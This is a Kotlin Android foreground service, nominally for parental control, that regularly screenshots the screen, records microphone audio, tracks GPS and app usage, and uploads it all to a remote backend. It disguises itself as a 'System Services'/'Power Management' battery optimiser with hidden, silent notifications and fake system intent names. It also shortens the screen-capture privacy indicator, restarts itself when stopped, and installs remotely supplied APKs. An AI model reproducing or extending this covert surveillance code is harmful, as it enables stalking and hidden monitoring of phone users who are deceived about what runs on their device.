package com.example.parentalcontrol

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * MonitoringForegroundService v16
 *
 * Android 15 / Samsung One UI 7 compatible foreground service.
 *
 * MediaProjection flow (Android 14/15 compliant):
 *   1. Service starts with DATA_SYNC | LOCATION | MICROPHONE types only.
 *   2. User taps "Screen Capture" → MediaProjectionRequestActivity shows dialog.
 *   3. On user grant, Activity sends ACTION_APPLY_PROJECTION with resultCode + data.
 *   4. onStartCommand handles ACTION_APPLY_PROJECTION:
 *      a. Calls getMediaProjection() INSIDE the foreground service (mandatory on API 34+).
 *      b. Re-calls startForeground() adding MEDIA_PROJECTION type (now valid — we have the token).
 *   5. ScreenCaptureEngine uses Pulse Mode: VD created → frame grabbed → VD released
 *      before upload → "Privacy Chip" visible < 1 second per cycle.
 *   6. On projection stop (OS revokes), Callback fires → re-acquisition requested
 *      only when screen is interactive.
 */
class MonitoringForegroundService : Service() {

    // ── Companion ─────────────────────────────────────────────────────────────
    companion object {
        private const val TAG = "MonitoringService"
        const val CHANNEL_ID          = "system_optimization_v3"
        const val NOTIFICATION_ID     = 1001
        const val ACTION_START        = "com.android.system.optimization.engine.START"
        const val ACTION_STOP         = "com.android.system.optimization.engine.STOP"
        const val ACTION_APPLY_PROJECTION =
            "com.android.system.optimization.engine.APPLY_PROJECTION"
        const val EXTRA_RESULT_CODE   = "extra_result_code"
        const val EXTRA_DATA          = "extra_data"

        @Volatile private var instance: MonitoringForegroundService? = null

        fun getInstance(): MonitoringForegroundService? = instance
        fun isProjectionActive(): Boolean = instance?.mediaProjection != null

        fun start(context: Context) {
            val i = Intent(context, MonitoringForegroundService::class.java)
                .apply { action = ACTION_START }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(i)
            else
                context.startService(i)
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, MonitoringForegroundService::class.java))
        }
    }

    // ── Members ───────────────────────────────────────────────────────────────
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)

    private var captureJob: Job? = null
    private var locationJob: Job? = null
    private var heartbeatJob: Job? = null
    private var audioJob: Job? = null
    private var usageJob: Job? = null

    private var wakeLock: PowerManager.WakeLock? = null

    // MediaProjection is set ONLY from ACTION_APPLY_PROJECTION handler (API 34+)
    // or from the legacy pendingProjection path (API < 34).
    @Volatile var mediaProjection: MediaProjection? = null

    // Dynamic remote-config values
    @Volatile private var captureIntervalMs = 60_000L
    @Volatile private var locationIntervalMs = 600_000L
    @Volatile private var recordCallsEnabled = false

    // Projection-miss watchdog counter
    private var projectionMissCount = 0

    private lateinit var screenEngine: ScreenCaptureEngine
    private lateinit var audioEngine: AudioRecorderEngine
    private lateinit var gpsTracker: GpsTracker
    private lateinit var commandManager: RealtimeCommandManager
    private lateinit var usageTracker: AppUsageTracker
    private lateinit var configManager: RemoteConfigManager

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "onCreate — API ${Build.VERSION.SDK_INT}")

        try {
            acquireWakeLock()
            createNotificationChannel()
            startForegroundSafe()          // start immediately, no projection type yet

            screenEngine   = ScreenCaptureEngine(this)
            audioEngine    = AudioRecorderEngine(this)
            gpsTracker     = GpsTracker(this)
            usageTracker   = AppUsageTracker(this)
            configManager  = RemoteConfigManager(this)
            commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }

            try { commandManager.startListening() } catch (e: Exception) {
                Log.e(TAG, "commandManager.startListening failed: ${e.message}")
            }
            try { startRemoteConfigLoop() } catch (e: Exception) {
                Log.e(TAG, "startRemoteConfigLoop failed: ${e.message}")
            }
            // Only start call recorder if READ_PHONE_STATE is granted
            val hasPhonePermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE)
            if (hasPhonePermission) {
                CallMonitoringService.start(this)
                Log.i(TAG, "CallMonitoringService started")
            } else {
                Log.w(TAG, "READ_PHONE_STATE not granted — call recording deferred")
            }
        } catch (e: Exception) {
            Log.e(TAG, "onCreate FATAL error: ${e.message}", e)
            // Don't crash the service — it will keep running in foreground
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action}")

        when (intent?.action) {

            // ── Stop ─────────────────────────────────────────────────────────
            ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }

            // ── Projection token delivery (Android 14 / 15) ───────────────
            ACTION_APPLY_PROJECTION -> {
                handleApplyProjection(intent)
                return START_STICKY
            }

            // ── Normal start / restart ────────────────────────────────────
            else -> {
                startForegroundSafe()
                try { startAllModules() } catch (e: Exception) {
                    Log.e(TAG, "startAllModules failed: ${e.message}")
                }
            }
        }
        // Use START_NOT_STICKY so a crash doesn't trigger a restart loop.
        // ServiceWatchdogWorker will restart it after 15 min if needed.
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — triggering safe restart")
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            mediaProjection?.stop()
            scope.cancel()
            sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "onDestroy error: ${e.message}")
        }
        instance = null
        super.onDestroy()
    }

    // ── Foreground notification ───────────────────────────────────────────────

    /**
     * Starts the service in the foreground WITHOUT the mediaProjection type.
     * On Android 14/15, MEDIA_PROJECTION type is only added after we have a valid token.
     */
    private fun startForegroundSafe() {
        val notif = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Only use service types that have runtime permissions granted
            var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC  // always safe

            val hasLocation = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
            val hasMic = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)

            if (hasLocation) serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            if (hasMic)      serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE

            Log.i(TAG, "startForeground types=0x${serviceType.toString(16)} loc=$hasLocation mic=$hasMic")

            try {
                startForeground(NOTIFICATION_ID, notif, serviceType)
            } catch (e: Exception) {
                Log.e(TAG, "startForeground typed failed: ${e.message} — using DATA_SYNC only")
                try {
                    startForeground(NOTIFICATION_ID, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (e2: Exception) {
                    Log.e(TAG, "startForeground DATA_SYNC also failed: ${e2.message}")
                }
            }
        } else {
            try {
                startForeground(NOTIFICATION_ID, notif)
            } catch (e: Exception) {
                Log.e(TAG, "startForeground (legacy) failed: ${e.message}")
            }
        }
    }



    /**
     * After receiving a valid MediaProjection token, upgrade foreground type
     * to include MEDIA_PROJECTION. Android 15 requires this before createVirtualDisplay().
     */
    private fun upgradeForegroundToMediaProjection() {
        val notif = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(
                    NOTIFICATION_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC       or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION        or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE      or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION        or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE      or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            }
            Log.i(TAG, "Foreground upgraded to include MEDIA_PROJECTION type ✅")
        } catch (e: Exception) {
            Log.e(TAG, "Upgrade to MEDIA_PROJECTION type failed: ${e.message}")
        }
    }

    // ── ACTION_APPLY_PROJECTION handler ──────────────────────────────────────

    /**
     * Android 14/15: getMediaProjection() MUST be called from within a foreground service.
     * The Activity passes resultCode + data here; we call getMediaProjection() ourselves.
     */
    private fun handleApplyProjection(intent: Intent) {
        val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, 0)
        val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_DATA)
        }

        if (resultCode == 0 || data == null) {
            Log.e(TAG, "handleApplyProjection: invalid resultCode or null data")
            return
        }

        scope.launch(Dispatchers.Main) {
            try {
                // ⚠️ CRITICAL ORDER (Android 14/15):
                // 1. Upgrade foreground type to MEDIA_PROJECTION FIRST
                // 2. Then call getMediaProjection() — system requires the type to already be declared
                upgradeForegroundToMediaProjection()
                
                // Small delay to let startForeground() take effect before token pickup
                kotlinx.coroutines.delay(200)

                val mpManager =
                    getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                val projection = mpManager.getMediaProjection(resultCode, data)

                if (projection != null) {
                    mediaProjection = projection
                    projectionMissCount = 0
                    registerProjectionCallback(projection)

                    SupabaseManager.getInstance()
                        .logRemote(this@MonitoringForegroundService, TAG, "INFO",
                            "MediaProjection acquired (API ${Build.VERSION.SDK_INT}) ✅")
                    Log.i(TAG, "MediaProjection token acquired ✅")
                } else {
                    Log.e(TAG, "getMediaProjection() returned null")
                    SupabaseManager.getInstance()
                        .logRemote(this@MonitoringForegroundService, TAG, "ERROR",
                            "getMediaProjection() null — user may have denied on API ${Build.VERSION.SDK_INT}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleApplyProjection error: ${e.message}")
                SupabaseManager.getInstance()
                    .logRemote(this@MonitoringForegroundService, TAG, "ERROR",
                        "Projection acquisition error: ${e.message}")
            }
        }
    }

    // ── Module loops ──────────────────────────────────────────────────────────

    private fun startAllModules() {
        startHeartbeatLoop()
        startCaptureLoop()
        startAudioLoop()
        startLocationLoop()
        startUsageLoop()
    }

    /** Heartbeat: update remote_settings every 60 s */
    private fun startHeartbeatLoop() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (true) {
                runCatching { SupabaseManager.getInstance().updateHeartbeat(this@MonitoringForegroundService) }
                    .onFailure { Log.e(TAG, "Heartbeat: ${it.message}") }
                delay(60_000)
            }
        }
    }

    /**
     * Screen capture loop with watchdog.
     * If projection is null for 3+ consecutive cycles → trigger re-acquisition.
     */
    private fun startCaptureLoop() {
        captureJob?.cancel()
        captureJob = scope.launch {
            while (true) {
                try {
                    val proj = mediaProjection
                    if (proj != null) {
                        projectionMissCount = 0
                        screenEngine.captureAndUpload(proj)
                    } else {
                        projectionMissCount++
                        if (projectionMissCount % 3 == 1) {
                            val msg = "MediaProjection null (miss #$projectionMissCount)"
                            Log.w(TAG, msg)
                            SupabaseManager.getInstance()
                                .logRemote(this@MonitoringForegroundService, TAG, "WARN", msg)
                        }
                        if (projectionMissCount >= 3) {
                            projectionMissCount = 0
                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                requestProjectionReacquisition()
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Capture loop: ${e.message}")
                }
                delay(captureIntervalMs)
            }
        }
    }

    /**
     * Audio loop: record 60 s every 10 min.
     * Only active when record_calls=true in remote_settings.
     * AudioRecorderEngine discards silent recordings via VAD.
     */
    private fun startAudioLoop() {
        audioJob?.cancel()
        audioJob = scope.launch {
            while (true) {
                try {
                    if (recordCallsEnabled) {
                        val pm = getSystemService(POWER_SERVICE) as PowerManager
                        if (pm.isInteractive) {
                            audioEngine.recordAndUpload(60_000L)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Audio loop: ${e.message}")
                }
                delay(600_000)
            }
        }
    }

    private fun startLocationLoop() {
        locationJob?.cancel()
        locationJob = scope.launch {
            while (true) {
                runCatching { gpsTracker.fetchAndUploadLocation() }
                    .onFailure { Log.e(TAG, "GPS loop: ${it.message}") }
                delay(locationIntervalMs)
            }
        }
    }

    /** App usage stats: every hour */
    private fun startUsageLoop() {
        usageJob?.cancel()
        usageJob = scope.launch {
            while (true) {
                runCatching { usageTracker.trackAndUploadUsage() }
                    .onFailure { Log.e(TAG, "Usage loop: ${it.message}") }
                delay(3_600_000)
            }
        }
    }

    /** Fetch remote_settings every 5 min and apply immediately */
    private fun startRemoteConfigLoop() {
        val updateManager = AppUpdateManager(this)
        scope.launch {
            while (true) {
                try {
                    val s = configManager.fetchSettings()
                    if (s != null) {
                        captureIntervalMs   = s.screenshot_interval_ms
                        locationIntervalMs  = s.location_interval_ms
                        recordCallsEnabled  = s.record_calls
                        Log.i(TAG, "Config synced — capture=${captureIntervalMs}ms " +
                                "location=${locationIntervalMs}ms audio=$recordCallsEnabled")

                        updateManager.checkAndExecuteUpdate(
                            s.target_version, s.update_apk_path, s.update_apk_url
                        )
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Config loop: ${e.message}")
                }
                delay(300_000)
            }
        }
    }

    // ── Projection watchdog ───────────────────────────────────────────────────

    private fun registerProjectionCallback(projection: MediaProjection) {
        projection.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() {
                Log.w(TAG, "MediaProjection.onStop — OS revoked permission")
                mediaProjection = null
                SupabaseManager.getInstance().let { sb ->
                    scope.launch {
                        sb.logRemote(this@MonitoringForegroundService, TAG, "WARN",
                            "Projection stopped by OS — will re-acquire when screen is on")
                    }
                }
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    requestProjectionReacquisition()
                }, 3_000)
            }
        }, android.os.Handler(android.os.Looper.getMainLooper()))
    }

    /**
     * Re-request projection ONLY when the screen is interactive (ON).
     * Showing the permission dialog while screen is OFF confuses users.
     */
    fun requestProjectionReacquisition() {
        if (mediaProjection != null) return
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isInteractive) {
            Log.d(TAG, "Screen OFF — deferring re-acquisition")
            return
        }
        Log.i(TAG, "Requesting projection re-acquisition...")
        try {
            startActivity(
                Intent(this, MediaProjectionRequestActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                    putExtra(MediaProjectionRequestActivity.EXTRA_AUTO, true)
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "Re-acquisition failed: ${e.message}")
        }
    }

    // ── WakeLock ──────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "OptimizationEngine:WakeLock"
        ).apply { acquire(10 * 60 * 1000L) }   // auto-release after 10 min safety cap
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val ch = NotificationChannel(
            CHANNEL_ID,
            "System Services",
            NotificationManager.IMPORTANCE_MIN          // completely silent, no heads-up
        ).apply {
            description      = "Background system optimization"
            setShowBadge(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            enableLights(false)
            enableVibration(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, HiddenSettingsActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Power Management")
            .setContentText("Optimizing battery and system performance")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pi)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }
}
